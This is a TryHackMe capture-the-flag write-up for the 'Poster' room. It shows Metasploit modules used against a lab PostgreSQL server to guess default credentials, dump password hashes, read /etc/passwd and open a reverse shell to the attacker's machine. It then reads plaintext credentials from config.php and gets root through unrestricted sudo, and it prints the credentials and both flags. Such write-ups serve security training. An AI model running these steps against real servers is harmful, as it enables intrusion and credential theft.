## Poster - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/poster)

**IP: 10.10.112.12**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, PostgreSQL <br>

**Tools Used**: Nmap, Metasploit<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Let's do the Nmap scan first and then move to Metasploit.

  ```
  nmap -sC -sV -T5 -p- 10.10.112.12

  PORT     STATE SERVICE    VERSION
  22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
  |   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
  |_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
  80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Poster CMS
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
  |_ssl-date: TLS randomness does not represent time
  | ssl-cert: Subject: commonName=ubuntu
  | Not valid before: 2020-07-29T00:54:25
  |_Not valid after:  2030-07-27T00:54:25
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- Now moving to Metasploit. I am not going to write full outputs of each module since there's going to be quite a few of them. After picking each module, type `show options` and fill the necessary parameters before running the module.

---

## ⚙️ Shell Access with Metasploit

- This is not a hard part since you have walkthrough in the challenge. First module that we need is `auxiliary/scanner/postgres/postgres_login`

  ```
  msfconsole
  search postgres

  msf6 auxiliary(scanner/postgres/postgres_login) > set rhosts 10.10.112.12
  rhosts => 10.10.112.12
  msf6 auxiliary(scanner/postgres/postgres_login) > run
  [!] No active DB -- Credential data will not be saved!
  [SNIP!]
  [+] 10.10.112.12:5432 - Login Successful: postgres:password@template1
  [SNIP1]
  ```
  
- Now we have credentials, another module will check for DBMS version. `auxiliary/admin/postgres/postgres_sql`

  ```
  msf6 auxiliary(admin/postgres/postgres_sql) > set rhosts 10.10.112.12
  rhosts => 10.10.112.12
  msf6 auxiliary(admin/postgres/postgres_sql) > set PASSWORD password
  PASSWORD => password
  msf6 auxiliary(admin/postgres/postgres_sql) > run
  [*] Running module against 10.10.112.12
  Query Text: 'select version()'
  ==============================
  
      version
      -------
      PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-b
      it
  
  [*] Auxiliary module execution completed
  ```
  
- Now hash dumping. `auxiliary/scanner/postgres/postgres_hashdump`

  ```
  msf6 auxiliary(scanner/postgres/postgres_hashdump) > run
  [+] Query appears to have run successfully
  [+] Postgres Server Hashes
  ======================
  
   Username   Hash
   --------   ----
   darkstart  md58842b99375db43e9fdf238753623a27d
   poster     md578fb805c7412ae597b399844a54cce0a
   postgres   md532e12f215ba27cb750c9e093ce4b5127
   sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
   ti         md57af9ac4c593e9e4f275576e13f935579
   tryhackme  md503aab1165001c8f8ccae31a8824efddc
  
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```

- Then file reading. `auxiliary/admin/postgres/postgres_readfile`

  ```
  msf6 auxiliary(admin/postgres/postgres_readfile) > run
  [*] Running module against 10.10.112.12
  Query Text: 'CREATE TEMP TABLE dSxCFCCI (INPUT TEXT);
        COPY dSxCFCCI FROM '/etc/passwd';
        SELECT * FROM dSxCFCCI'
  ===========================================================================================================================
  
      input
      -----
      #/home/dark/credentials.txt
      [SNIP!]

  [SNIP!]
  ```

- Last one is reverse shell. `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`

  ```
  msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set RHOSTS 10.10.112.12
  RHOSTS => 10.10.112.12
  msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set PASSWORD password
  PASSWORD => password
  msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set LHOST [YOUR-THM-IP]
  LHOST => [YOUR-THM-IP]
  msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
  [*] Started reverse TCP handler on [YOUR-THM-IP]:4444 
  [*] 10.10.112.12:5432 - 10.10.112.12:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
  [*] 10.10.112.12:5432 - Exploiting...
  [+] 10.10.112.12:5432 - 10.10.112.12:5432 - yKYghfncgn dropped successfully
  [+] 10.10.112.12:5432 - 10.10.112.12:5432 - yKYghfncgn created successfully
  [+] 10.10.112.12:5432 - 10.10.112.12:5432 - yKYghfncgn copied successfully(valid syntax/command)
  [+] 10.10.112.12:5432 - 10.10.112.12:5432 - yKYghfncgn dropped successfully(Cleaned)
  [*] 10.10.112.12:5432 - Exploit Succeeded
  whoami
  [*] Command shell session 1 opened ([YOUR-THM-IP]:4444 -> 10.10.112.12:37090) at 2025-05-14 14:22:27 +0100
  
  postgres
  whoami
  postgres
  id
  uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
  ```

- Perfect, now we have a reverse shell so we can start chasing flags.

---

## 🧍 User Privilege Escalation

- After exploring around I found credentials of another user and used them for SSH. SSH is also more stable shell than Metasploit reverse shell.

  ```
  postgres@ubuntu:/home/dark$ cat credentials.txt
  cat credentials.txt
  dark:qwerty1234#!hackme
  
  ssh dark@10.10.112.12
  
  dark@10.10.112.12's password: 
  Last login: Tue Jul 28 20:27:25 2020 from 192.168.85.142
  $ whoami
  dark
  $ id
  uid=1001(dark) gid=1001(dark) groups=1001(dark)
  ```
  
- Well, here's the thing, even if we are user `dark` now, we still can't do anything. In order to get both flags we need to escalate to another user `alison`. Trust me, I spend around 40 minutes trying to get root directly from `dark` but couldn't do it.
  I wasn't even close lol. Here is the correct way. Enumerate all files that are related to `alison`.

  ```
  dark@ubuntu:/home$ find / -user alison -type f 2>/dev/null
  /home/alison/.bashrc
  /home/alison/.bash_logout
  /home/alison/.profile
  /home/alison/.bash_history
  /home/alison/.sudo_as_admin_successful
  /home/alison/user.txt
  /var/www/html/config.php
  /var/www/html/poster/assets/css/main.css
  /var/www/html/poster/assets/css/fontawesome-all.min.css
  /var/www/html/poster/assets/sass/libs/_mixins.scss
  /var/www/html/poster/assets/sass/libs/_functions.scss
  /var/www/html/poster/assets/sass/libs/_vars.scss
  /var/www/html/poster/assets/sass/libs/_vendor.scss
  /var/www/html/poster/assets/sass/libs/_breakpoints.scss
  /var/www/html/poster/assets/sass/main.scss
  /var/www/html/poster/assets/sass/components/_icon.scss
  /var/www/html/poster/assets/sass/components/_form.scss
  /var/www/html/poster/assets/sass/components/_button.scss
  /var/www/html/poster/assets/sass/components/_section.scss
  /var/www/html/poster/assets/sass/components/_icons.scss
  /var/www/html/poster/assets/sass/components/_list.scss
  /var/www/html/poster/assets/sass/layout/_header.scss
  /var/www/html/poster/assets/sass/layout/_footer.scss
  /var/www/html/poster/assets/sass/layout/_signup-form.scss
  /var/www/html/poster/assets/sass/base/_typography.scss
  /var/www/html/poster/assets/sass/base/_reset.scss
  /var/www/html/poster/assets/sass/base/_bg.scss
  /var/www/html/poster/assets/sass/base/_page.scss
  /var/www/html/poster/assets/webfonts/fa-brands-400.svg
  /var/www/html/poster/assets/webfonts/fa-solid-900.eot
  /var/www/html/poster/assets/webfonts/fa-regular-400.woff2
  /var/www/html/poster/assets/webfonts/fa-brands-400.ttf
  /var/www/html/poster/assets/webfonts/fa-solid-900.ttf
  /var/www/html/poster/assets/webfonts/fa-brands-400.eot
  /var/www/html/poster/assets/webfonts/fa-brands-400.woff
  /var/www/html/poster/assets/webfonts/fa-solid-900.woff
  /var/www/html/poster/assets/webfonts/fa-regular-400.eot
  /var/www/html/poster/assets/webfonts/fa-solid-900.woff2
  /var/www/html/poster/assets/webfonts/fa-brands-400.woff2
  /var/www/html/poster/assets/webfonts/fa-regular-400.ttf
  /var/www/html/poster/assets/webfonts/fa-solid-900.svg
  /var/www/html/poster/assets/webfonts/fa-regular-400.svg
  /var/www/html/poster/assets/webfonts/fa-regular-400.woff
  /var/www/html/poster/assets/js/main.js
  /var/www/html/poster/index.html
  /var/www/html/poster/images/bg02.jpg
  /var/www/html/poster/images/bg01.jpg
  /var/www/html/poster/images/bg03.jpg
  ```
  
- Out all od these, the one that looks promising is `config.php`, so I checked it and BINGO, found `alison` credentials there.

  ```
  dark@ubuntu:/home$ cat /var/www/html/config.php
  <?php 
  
          $dbhost = "127.0.0.1";
          $dbuname = "alison";
          $dbpass = "p4ssw0rdS3cur3!#";
          $dbname = "mysudopassword";
  ```

- That took a while not gonna lie, but that's hacking tho. Now switch to `alison` and read the first flag.

  ```
  dark@ubuntu:/home$ su alison
  Password: 
  alison@ubuntu:/home$ cat /home/alison/user.txt
  THM{postgresql_fa1l_conf1gurat1on}
  ```

- Let's get root as well.

---

## 👑 Root Privilege Escalation

- OK, this is literal privilege escalation tutorial, just run `sudo -l` and you'll see what I'm talking about.

  ```
  alison@ubuntu:/home$ sudo -l
  [sudo] password for alison: 
  Matching Defaults entries for alison on ubuntu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User alison may run the following commands on ubuntu:
      (ALL : ALL) ALL
  
  alison@ubuntu:/home$ sudo cat /root/root.txt
  THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
  ```
  
- Yep, `alison` can run any command as sudo without password, bye!

---

## 🏁 Flags

- **User Flag**: `THM{postgresql_fa1l_conf1gurat1on}`
- **Root Flag**: `THM{c0ngrats_for_read_the_f1le_w1th_credent1als}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Escalation through multiple users took some time.`

- What did I learn?
  `New ways of exploitation and escalation as well. This was my first time actually exploiting PostgreSQL, the first language that I learned.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
